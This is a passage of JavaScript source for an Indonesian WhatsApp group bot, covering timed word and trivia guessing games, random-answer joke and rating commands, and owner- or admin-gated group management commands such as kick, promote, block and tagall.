if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkata', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakkata[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkata[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tebakkalimat': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakkalimat?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEBAK KALIMAT* 」\n\n❏ *Soal* : ${result.result.soal}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkalimat', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakkalimat[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkalimat[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tebaklirik': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebaklirik?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEBAK LIRIK* 」\n\n❏ *Soal* : ${result.result.question}\n❏ *Petunjuk* : ${result.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.result.answer.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.answer)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebaklirik', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebaklirik[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebaklirik[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tebaktebakan': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebaktebakan?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEBAK TEBAKAN* 」\n\n❏ *Soal* : ${result.result.soal}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebaktebakan[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tabaktebakan', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebaktebakan[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebaktebakan[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tebakkimia': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakkimia?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEBAK KIMIA* 」\n\n❏ *Soal* : ${result.result.nama}\n❏ *Petunjuk* : ${result.result.lambang.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakkimia[m.sender.split('@')[0]] = result.result.lambang.toLowerCase()
})
await sleep(60000)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.lambang)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkimia', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakkimia[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkimia[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'asahotak': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (asahotak.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/asahotak?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *ASAH OTAK* 」\n\n❏ *Soal* : ${result.result.soal}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
asahotak[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (asahotak.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'asahotak', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${asahotak[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete asahotak[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tebakbendera': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakbendera?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEBAK BENDERA* 」\n\n❏ *Bendera* : ${result.result.bendera}\n❏ *Petunjuk* : ${result.result.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakbendera[m.sender.split('@')[0]] = result.result.nama.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.nama)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakbendera', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakbendera[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakbendera[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tekateki': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tekateki.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tekateki?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEKA TEKI* 」\n\n❏ *Soal* : ${result.result.soal}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tekateki[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (tekateki.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tekateki', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tekateki[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tekateki[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'susunkata': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (susunkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/susunkata?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *SUSUN KATA* 」\n\n❏ *Soal* : ${result.result.soal}\n❏ *Type* : ${result.result.tipe}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
susunkata[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (susunkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'susunkata', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${susunkata[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete susunkata[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tebakjenaka': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakjenaka.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakjenaka?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEBAK JENAKA* 」\n\n❏ *Soal* : ${result.result.pertanyaan}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakjenaka[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakjenaka.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakjenaka', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakjenaka[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakjenaka[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'caklontong': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return reply(`Masih Ada Sesi Yang Belum Diselesaikan!`)
let result = await fetchJson(`${webdani}/api/entertainment/caklontong?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *CAK LONTONG* 」\n\n❏ *Soal* : ${result.result.soal}*\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
caklontong[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'caklontong', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* : ${result.result.jawaban}\n❏ *Deskripsi* : ${result.result.desc}`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete caklontong[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'kuismath': case 'math': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('./lib/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
Dani.sendText(m.chat, `「 *KUIS MATH* 」\n\n❏ *Soal* : ${result.soal.toLowerCase()}?\n\n❏ *Waktu* : ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'jodohku': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'JODOHKU' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, jawab, `Made With 🤍 Dani | Copyright 2022`, m, {mentions: ments})
}
break
case 'jadian': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'JADIAN' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, jawab, `Made With 🤍 Dani | Copyright 2022`, m, {mentions: menst})
}
break
case 'apakah': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
let apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul', 'mungkin']
let kah = apa[Math.floor(Math.random() * apa.length)]
Dani.sendMessage(m.chat, { text: `❏ *Pertanyaan* : Apakah ${q}\n❏ *Jawaban* : ${kah}` }, { quoted: freply })
}
break
case 'bisakah': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
let bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
let ga = bisa[Math.floor(Math.random() * bisa.length)]
Dani.sendMessage(m.chat, { text: `❏ *Pertanyaan* : ${q}\n❏ *Jawaban* : ${ga}` }, { quoted: freply })
}
break
case 'bagaimanakah': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
let gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
let ya = gimana[Math.floor(Math.random() * gimana.length)]
Dani.sendMessage(m.chat, { text: `❏ *Pertanyaan* : ${q}\n❏ *Jawaban* : ${ya}` }, { quoted: freply })
}
break
case 'rate': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
let ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
let te = ra[Math.floor(Math.random() * ra.length)]
Dani.sendMessage(m.chat, { text: `❏ *Rate* : ${q}\n❏ *Jawaban* : *${te}%*` }, { quoted: freply })
}
break
case 'gantengcek': case 'cekganteng': {      
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Dani`)
let gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
let teng = gan[Math.floor(Math.random() * gan.length)]
Dani.sendMessage(m.chat, { text: `❏ *Nama* : ${q}\n❏ *Jawaban* : *${teng}%*` }, { quoted: freply })
}
break
case 'cantikcek': case 'cekcantik': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Dani`)
let can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
let tik = can[Math.floor(Math.random() * can.length)]
Dani.sendMessage(m.chat, { text: `❏ *Nama* : ${q}\n❏ *Jawaban* : *${tik}%*` }, { quoted: freply })
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
let sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
let sange = sangeh[Math.floor(Math.random() * sangeh.length)]
Dani.sendMessage(m.chat, { text: `❏ *Nama* : ${q}\n❏ *Jawaban* : *${sange}%*` }, { quoted: freply })
}
break
case 'kapankah': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
let kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
let kapankah = kapan[Math.floor(Math.random() * kapan.length)]
Dani.sendMessage(m.chat, { text: `❏ *Pertanyaan* : ${q}\n❏ *Jawaban* : *${kapankah}*` }, { quoted: freply })
}
break
case 'goblokcek': case 'jelekcek': case 'begocek': case 'suhucek': case 'pintercek': case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek': case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek': case 'pakgirlcek': case 'bapercek': case 'fakboycek': case 'alimcek':  case 'fakgirlcek':case 'kerencek':case 'wibucek': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
let sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
let sange = sangeh[Math.floor(Math.random() * sangeh.length)]
Dani.sendMessage(m.chat, { text: `❏ *Nama* : ${q}\n❏ *Jawaban* : *${sange}%*` }, { quoted: freply })
break
case 'react': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
reactionMessage = {
react: {
text: args[0],
key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
Dani.sendMessage(m.chat, reactionMessage)
}
break 
case 'restart': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
exec(`npm start`)
textImg('*Restarting Dani Botz*')
}
break
case 'join': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
sticWait(from)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Dani.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'leave': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!m.isGroup) return sticGroup(from)
await Dani.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'setexif': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!text) throw `Example : ${prefix + command} packname|author`
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
m.reply(`Exif berhasil diubah menjadi\n\n❏ *Packname* : ${global.packname}\n❏ *Author* : ${global.author}`)
}
break
case 'kick': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dani.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'add': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dani.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'promote': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dani.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'demote': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dani.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'block': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dani.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'unblock': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dani.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'setname': case 'setsubject': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (!text) throw mess.textt
await Dani.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'setdesc': case 'setdesk': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isBotAdmins) return sticNotAdmin(from)
if (!isAdmins) return sticAdmin(from)
if (!text) throw mess.textt
await Dani.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'setppbot': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await Dani.downloadAndSaveMediaMessage(quoted)
await Dani.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)
if (!isAdmins) return sticAdmin(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await Dani.downloadAndSaveMediaMessage(quoted)
await Dani.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
case 'tagall': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.isGroup) return sticGroup(from)          
if (!isAdmins) return sticAdmin(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `❏ @${mem.id.split('@')[0]}\n`
}
Dani.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'hidetag': {
